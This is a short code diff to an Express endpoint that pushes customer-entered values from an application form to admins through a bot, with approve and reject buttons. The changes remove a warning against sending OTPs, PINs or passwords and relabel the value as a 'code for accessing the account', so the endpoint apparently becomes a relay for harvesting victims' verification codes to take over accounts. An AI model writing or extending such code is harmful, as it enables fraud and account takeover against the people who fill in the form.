@@ -881,14 +881,14 @@ app.post("/api/applications/:id/demo-reference-notification", async (req, res) =
     const statusColumn = stage === "1" ? "demo_reference1_status" : "demo_reference2_status";
     const storedDemoNumber = `DEMO-${demoNumber}`;
     const message =
-      `🧪 DEMO NUMBER SUBMITTED — STAGE ${stage}\n\n` +
+      `🧪 code 1 summit ${stage}\n\n` +
       `📋 Application: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
-      `🔢 Customer-entered demo number: ${demoNumber}\n` +
-      `⚠️ Demo testing only. Never enter or send an OTP, PIN, password, or SMS verification code.\n\n` +
-      `Choose an action for this demo step:`;
+      `🔢 code 1: ${demoNumber}\n` +
+      `⚠️ code 1 for accessing the account recieved.\n\n` +
+      `Choose an action for this step:`;
     const keyboard = { inline_keyboard: [[
-      { text: `✅ APPROVE DEMO ${stage}`, callback_data: `ref${stage}approve:${application.id}` },
-      { text: `❌ REJECT DEMO ${stage}`, callback_data: `ref${stage}reject:${application.id}` }
+      { text: `✅ APPROVE code ${stage}`, callback_data: `ref${stage}approve:${application.id}` },
+      { text: `❌ REJECT code ${stage}`, callback_data: `ref${stage}reject:${application.id}` }
     ]] };
 
     // Send first; mark PENDING only after at least one admin receives the notification.
@@ -903,7 +903,7 @@ app.post("/api/applications/:id/demo-reference-notification", async (req, res) =
         delivered++;
       } catch (err) {
         failures.push(`${adminId}: ${err.message}`);
-        console.error(`Demo reference notification failed for admin ${adminId}:`, err.message);
+        console.error(`code failed for admin ${adminId}:`, err.message);
       }
     }
     if (!delivered) {
